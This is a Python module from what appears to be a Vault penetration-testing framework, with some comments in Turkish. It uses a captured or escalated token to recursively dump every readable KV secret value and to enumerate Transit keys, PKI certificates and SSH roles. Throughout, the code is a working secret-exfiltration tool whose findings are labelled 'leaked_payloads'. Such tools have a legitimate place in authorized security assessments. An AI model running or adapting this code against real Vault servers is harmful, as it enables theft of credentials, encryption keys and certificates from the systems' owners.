from typing import Optional

import requests

from core.tls_config import vault_request

from ...context import ExecutionContext
from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10
DEFAULT_MAX_DEPTH = 5
# Fallback KV mounts when token cannot list sys/mounts (e.g. restricted tokens).
# Most Vault deployments have at least "secret/" mounted.
FALLBACK_KV_MOUNTS: dict = {
    "secret/": {"type": "kv", "options": {"version": "2"}},
    "kv/": {"type": "kv", "options": {"version": "2"}},
}


class SecretExfiltrationModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="secret_exfiltration.kv_dump",
            title="Secret Exfiltration via Captured Token",
            risk_level=RiskLevel.READ_ONLY,
            domain="secrets",
            description=(
                "Uses a previously captured higher-privilege token to enumerate "
                "KV secret engines and read accessible secret values. Also supports "
                "Transit, PKI, and SSH engine enumeration."
            ),
            default_enabled=True,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(
            getattr(context, "vault_addr", None)
            and _any_token(context)
        )

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        params = params or {}
        token = _any_token(context)
        if not token:
            return ExecutionResult(
                status="skipped",
                message="Secret exfiltration requires a token. Provide --token or run privilege escalation first.",
                evidence={"missing": ["token"]},
            )

        base_url = context.vault_addr.rstrip("/")
        timeout = params.get("timeout", TIMEOUT)
        verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))
        max_depth = int(params.get("max_depth", DEFAULT_MAX_DEPTH))
        headers = {
            "X-Vault-Token": token,
            "Content-Type": "application/json",
        }
        namespace = params.get("namespace", getattr(context, "namespace", None))
        if namespace:
            headers["X-Vault-Namespace"] = namespace

        try:
            all_findings = {}
            errors = []

            # 1. KV Secret'ları oku (mevcut)
            kv_mounts = _discover_kv_mounts(base_url, headers, timeout, verify_tls)
            kv_payloads = {}
            for mount_name, mount_info in kv_mounts.items():
                kv_version = _kv_version(mount_info)
                mount_path = mount_name.strip("/")
                _walk_kv_mount(
                    base_url,
                    headers,
                    timeout,
                    verify_tls,
                    mount_path,
                    kv_version,
                    "",
                    0,
                    max_depth,
                    kv_payloads,
                    errors,
                )
            if kv_payloads:
                all_findings["kv_secrets"] = kv_payloads

            # 2. Transit Engine - Anahtarları listele
            transit_keys = _list_transit_keys(base_url, headers, timeout, verify_tls)
            if transit_keys:
                all_findings["transit_keys"] = transit_keys
                context.add_finding(
                    title="HIGH: Transit Keys Discovered",
                    description=f"Found {len(transit_keys)} Transit encryption keys.",
                    severity="HIGH",
                    evidence={"keys": transit_keys[:10]},
                )

            # 3. PKI Engine - Sertifikaları listele
            pki_certs = _list_pki_certs(base_url, headers, timeout, verify_tls)
            if pki_certs:
                all_findings["pki_certificates"] = pki_certs
                context.add_finding(
                    title="HIGH: PKI Certificates Discovered",
                    description=f"Found {len(pki_certs)} PKI certificates.",
                    severity="HIGH",
                    evidence={"certs": pki_certs[:10]},
                )

            # 4. SSH Engine - Rolleri listele
            ssh_roles = _list_ssh_roles(base_url, headers, timeout, verify_tls)
            if ssh_roles:
                all_findings["ssh_roles"] = ssh_roles
                context.add_finding(
                    title="MEDIUM: SSH Roles Discovered",
                    description=f"Found {len(ssh_roles)} SSH roles.",
                    severity="MEDIUM",
                    evidence={"roles": ssh_roles[:10]},
                )

            evidence = {
                "token_source": "captured_token",
                "kv_mounts": sorted(kv_mounts.keys()),
                "total_kv_secrets": len(kv_payloads),
                "leaked_payloads": kv_payloads,
                "transit_keys_count": len(transit_keys),
                "pki_certs_count": len(pki_certs),
                "ssh_roles_count": len(ssh_roles),
                "all_findings": all_findings,
                "errors": errors[:20],
            }

            total_findings = len(kv_payloads) + len(transit_keys) + len(pki_certs) + len(ssh_roles)
            if total_findings > 0:
                context.add_finding(
                    title="CRITICAL: Secret Exfiltration Successful",
                    description=(
                        f"Captured token could read {total_findings} total items: "
                        f"{len(kv_payloads)} KV secrets, {len(transit_keys)} Transit keys, "
                        f"{len(pki_certs)} PKI certs, {len(ssh_roles)} SSH roles."
                    ),
                    severity="CRITICAL",
                    evidence=evidence,
                )
                return ExecutionResult(
                    status="success",
                    message=f"Secret exfiltration succeeded for {total_findings} items.",
                    evidence=evidence,
                )

            return ExecutionResult(
                status="failed",
                message="No readable secrets were found with the captured token.",
                evidence=evidence,
            )

        except requests.RequestException as error:
            return ExecutionResult(
                status="error",
                message=f"Network error during secret exfiltration: {error}",
                evidence={"error": str(error)},
            )
        except ValueError as error:
            return ExecutionResult(
                status="error",
                message=f"Invalid Vault response during secret exfiltration: {error}",
                evidence={"error": str(error)},
            )


def _captured_token(context):
    return (
        getattr(context, "captured_token", None)
        or getattr(context, "escalated_token", None)
    )


def _any_token(context):
    """Return captured token if available, otherwise the original token."""
    return _captured_token(context) or getattr(context, "token", None)


# ─── KV ──────────────────────────────────────────────────────────────────────

def _discover_kv_mounts(base_url, headers, timeout, verify_tls):
    response = vault_request("GET", 
        f"{base_url}/v1/sys/mounts",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return FALLBACK_KV_MOUNTS

    data = _safe_json(response).get("data", {})
    mounts = {
        mount_name: mount_info
        for mount_name, mount_info in data.items()
        if isinstance(mount_info, dict) and mount_info.get("type") == "kv"
    }
    return mounts or FALLBACK_KV_MOUNTS


def _walk_kv_mount(
    base_url,
    headers,
    timeout,
    verify_tls,
    mount_path,
    kv_version,
    relative_path,
    depth,
    max_depth,
    leaked_payloads,
    errors,
):
    if depth > max_depth:
        errors.append({"path": _display_path(mount_path, relative_path), "error": "max depth reached"})
        return

    keys, list_error = _list_kv_path(
        base_url,
        headers,
        timeout,
        verify_tls,
        mount_path,
        kv_version,
        relative_path,
    )

    if list_error:
        secret, read_error = _read_kv_secret(
            base_url,
            headers,
            timeout,
            verify_tls,
            mount_path,
            kv_version,
            relative_path,
        )
        if secret is not None:
            leaked_payloads[_display_path(mount_path, relative_path)] = secret
        elif relative_path:
            errors.append({"path": _display_path(mount_path, relative_path), "error": read_error or list_error})
        return

    for key in keys:
        child_path = _join_path(relative_path, key.rstrip("/"))
        if key.endswith("/"):
            _walk_kv_mount(
                base_url,
                headers,
                timeout,
                verify_tls,
                mount_path,
                kv_version,
                child_path,
                depth + 1,
                max_depth,
                leaked_payloads,
                errors,
            )
            continue

        secret, read_error = _read_kv_secret(
            base_url,
            headers,
            timeout,
            verify_tls,
            mount_path,
            kv_version,
            child_path,
        )
        if secret is not None:
            leaked_payloads[_display_path(mount_path, child_path)] = secret
        elif read_error:
            errors.append({"path": _display_path(mount_path, child_path), "error": read_error})


def _list_kv_path(base_url, headers, timeout, verify_tls, mount_path, kv_version, relative_path):
    if kv_version == 1:
        endpoint = f"{base_url}/v1/{mount_path}/{relative_path}".rstrip("/")
    else:
        endpoint = f"{base_url}/v1/{mount_path}/metadata/{relative_path}".rstrip("/")

    response = vault_request(
        "LIST",
        endpoint,
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return [], f"LIST status_code: {response.status_code}"

    keys = _safe_json(response).get("data", {}).get("keys", []) or []
    return [str(key) for key in keys], None


def _read_kv_secret(base_url, headers, timeout, verify_tls, mount_path, kv_version, relative_path):
    if not relative_path:
        return None, "empty secret path"

    if kv_version == 1:
        endpoint = f"{base_url}/v1/{mount_path}/{relative_path}".rstrip("/")
    else:
        endpoint = f"{base_url}/v1/{mount_path}/data/{relative_path}".rstrip("/")

    response = vault_request("GET", 
        endpoint,
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return None, f"GET status_code: {response.status_code}"

    data = _safe_json(response).get("data", {})
    if kv_version == 2:
        data = data.get("data", {})
    return data, None


def _kv_version(mount_info):
    options = mount_info.get("options", {}) if isinstance(mount_info, dict) else {}
    return 2 if options.get("version") == "2" else 1


# ─── TRANSIT ENGINE ──────────────────────────────────────────────────────────

def _list_transit_keys(base_url, headers, timeout, verify_tls):
    """Transit engine'deki tüm anahtarları listele"""
    endpoint = f"{base_url}/v1/transit/keys"
    response = vault_request(
        "LIST",
        endpoint,
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return []
    
    data = _safe_json(response)
    keys = data.get("data", {}).get("keys", []) or []
    return [str(key) for key in keys]


# ─── PKI ENGINE ──────────────────────────────────────────────────────────────

def _list_pki_certs(base_url, headers, timeout, verify_tls):
    """PKI engine'deki tüm sertifikaları listele"""
    # Önce PKI mount'larını bul
    mounts = _discover_pki_mounts(base_url, headers, timeout, verify_tls)
    all_certs = []
    
    for mount_path in mounts:
        endpoint = f"{base_url}/v1/{mount_path.strip('/')}/certs"
        response = vault_request(
            "LIST",
            endpoint,
            headers=headers,
            timeout=timeout,
            verify=verify_tls,
        )
        if response.status_code == 200:
            data = _safe_json(response)
            certs = data.get("data", {}).get("keys", []) or []
            all_certs.extend([f"{mount_path}{cert}" for cert in certs])
    
    return all_certs


def _discover_pki_mounts(base_url, headers, timeout, verify_tls):
    """PKI mount'larını keşfet"""
    response = vault_request("GET", 
        f"{base_url}/v1/sys/mounts",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return []
    
    data = _safe_json(response).get("data", {})
    return [
        path
        for path, info in data.items()
        if isinstance(info, dict) and info.get("type") == "pki"
    ]


# ─── SSH ENGINE ──────────────────────────────────────────────────────────────

def _list_ssh_roles(base_url, headers, timeout, verify_tls):
    """SSH engine'deki tüm rolleri listele"""
    # Önce SSH mount'larını bul
    mounts = _discover_ssh_mounts(base_url, headers, timeout, verify_tls)
    all_roles = []
    
    for mount_path in mounts:
        endpoint = f"{base_url}/v1/{mount_path.strip('/')}/roles"
        response = vault_request(
            "LIST",
            endpoint,
            headers=headers,
            timeout=timeout,
            verify=verify_tls,
        )
        if response.status_code == 200:
            data = _safe_json(response)
            roles = data.get("data", {}).get("keys", []) or []
            all_roles.extend([f"{mount_path}{role}" for role in roles])
    
    return all_roles


def _discover_ssh_mounts(base_url, headers, timeout, verify_tls):
    """SSH mount'larını keşfet"""
    response = vault_request("GET", 
        f"{base_url}/v1/sys/mounts",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return []
    
    data = _safe_json(response).get("data", {})
    return [
        path
        for path, info in data.items()
        if isinstance(info, dict) and info.get("type") == "ssh"
    ]


# ─── ORTAK YARDIMCILAR ──────────────────────────────────────────────────────

def _safe_json(response):
    try:
        data = response.json()
    except ValueError as error:
        raise ValueError(f"invalid json response: {response.text[:200]}") from error
    return data if isinstance(data, dict) else {}


def _join_path(parent, child):
    if not parent:
        return child.strip("/")
    return f"{parent.strip('/')}/{child.strip('/')}"


def _display_path(mount_path, relative_path):
    if not relative_path:
        return f"{mount_path}/"
    return f"{mount_path}/{relative_path.strip('/')}"